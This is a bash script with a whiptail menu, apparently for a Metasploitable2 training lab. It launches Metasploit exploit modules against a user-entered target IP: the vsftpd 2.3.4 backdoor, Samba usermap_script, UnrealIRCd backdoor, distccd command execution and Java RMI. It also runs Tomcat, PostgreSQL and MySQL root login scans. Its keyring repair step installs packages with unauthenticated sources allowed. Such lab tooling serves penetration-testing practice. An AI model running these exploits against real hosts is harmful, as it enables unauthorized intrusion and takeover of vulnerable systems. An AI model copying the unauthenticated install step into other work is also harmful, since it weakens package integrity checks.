#!/bin/bash
# ============================================================
# Metasploit Attack Menu — TUI
# Description : Whiptail menu for launching known Metasploitable2
#               exploit modules through the native msfconsole
#               already installed on the attacker machine (e.g.
#               Kali ships with Metasploit Framework built in).
#               No Docker required on the attacker side.
# Usage       : sudo bash setup_attacker.sh
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ============================================================
# STEP 0: Ensure msfconsole is present (not auto-installed — it's
#         a large framework; Kali ships it by default)
# ============================================================
if ! command -v msfconsole &> /dev/null; then
  echo -e "${RED}[ERROR] msfconsole not found on this machine.${NC}"
  echo -e "${YELLOW}[HINT] Install Metasploit Framework first, e.g.:${NC}"
  echo -e "  sudo apt update && sudo apt install -y metasploit-framework"
  exit 1
fi

# ============================================================
# STEP 1: Ensure whiptail is present (powers the TUI menu) —
#         the only dependency this script installs itself
# ============================================================
if ! command -v whiptail &> /dev/null; then
  echo -e "${YELLOW}[INFO] whiptail not found. Installing...${NC}"
  if ! apt update -qq 2>/dev/null; then
    # Repair a stale Kali archive keyring (NO_PUBKEY / unsigned repo) if needed
    if grep -qi '^ID=kali' /etc/os-release 2>/dev/null; then
      echo -e "${YELLOW}[INFO] Package index unsigned — repairing kali-archive-keyring...${NC}"
      apt-get update -qq --allow-unauthenticated
      apt-get install -y --allow-unauthenticated --reinstall kali-archive-keyring
    fi
  fi
  if ! (apt update -qq && apt install -y whiptail); then
    echo -e "${RED}[ERROR] whiptail installation failed. Aborting.${NC}"
    exit 1
  fi
  echo -e "${GREEN}[OK] whiptail installed.${NC}"
fi

# ============================================================
# STEP 2: Ask for target IP
# ============================================================
TARGET_IP=$(whiptail --title "Metasploit Attack Menu" \
  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "192.168.2.20" \
  3>&1 1>&2 2>&3)
if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
  echo -e "${RED}[ERROR] No target IP provided. Aborting.${NC}"
  exit 1
fi

LHOST=$(hostname -I | awk '{print $1}')

# ============================================================
# STEP 3: Attack menu loop — pick a module, run it, repeat
# ============================================================
while true; do
  CHOICE=$(whiptail --title "Metasploit Attack Menu — Target: $TARGET_IP" \
    --menu "Choose an exploit to launch:" 21 78 10 \
    "1" "FTP Backdoor - vsftpd 2.3.4 (port 21)" \
    "2" "Samba usermap_script (port 445)" \
    "3" "UnrealIRCd Backdoor (port 6667)" \
    "4" "distccd Command Execution (port 3632)" \
    "5" "Java RMI Server (port 1099)" \
    "6" "Tomcat Manager login scan (port 8180)" \
    "7" "PostgreSQL weak credentials (port 5432)" \
    "8" "MySQL no root password (port 3306)" \
    "9" "Open msfconsole (manual / free-form)" \
    3>&1 1>&2 2>&3)

  if [ $? -ne 0 ] || [ -z "$CHOICE" ]; then
    echo -e "${YELLOW}[INFO] Exiting attack menu.${NC}"
    break
  fi

  case "$CHOICE" in
    1) MSF_CMD="use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET_IP; run" ;;
    2) MSF_CMD="use exploit/multi/samba/usermap_script; set RHOSTS $TARGET_IP; run" ;;
    3) MSF_CMD="use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET_IP; run" ;;
    4) MSF_CMD="use exploit/unix/misc/distcc_exec; set RHOSTS $TARGET_IP; run" ;;
    5) MSF_CMD="use exploit/multi/misc/java_rmi_server; set RHOSTS $TARGET_IP; run" ;;
    6) MSF_CMD="use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS $TARGET_IP; set RPORT 8180; run" ;;
    7) MSF_CMD="use auxiliary/scanner/postgres/postgres_login; set RHOSTS $TARGET_IP; run" ;;
    8) MSF_CMD="use auxiliary/scanner/mysql/mysql_login; set RHOSTS $TARGET_IP; set USERNAME root; run" ;;
    9) MSF_CMD="" ;;
  esac

  FULL_CMD="setg LHOST $LHOST; setg RHOSTS $TARGET_IP"
  if [ -n "$MSF_CMD" ]; then
    FULL_CMD="$FULL_CMD; $MSF_CMD"
  fi

  echo -e "\n${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}${NC}"
  echo -e "${CYAN}[INFO] Target IP   (RHOSTS): ${TARGET_IP}${NC}"

  msfconsole -q -x "$FULL_CMD"

  if ! whiptail --title "Metasploit Attack Menu" --yesno "Run another module against $TARGET_IP?" 8 60; then
    break
  fi
done

echo -e "\n${GREEN}Session ended.${NC}"
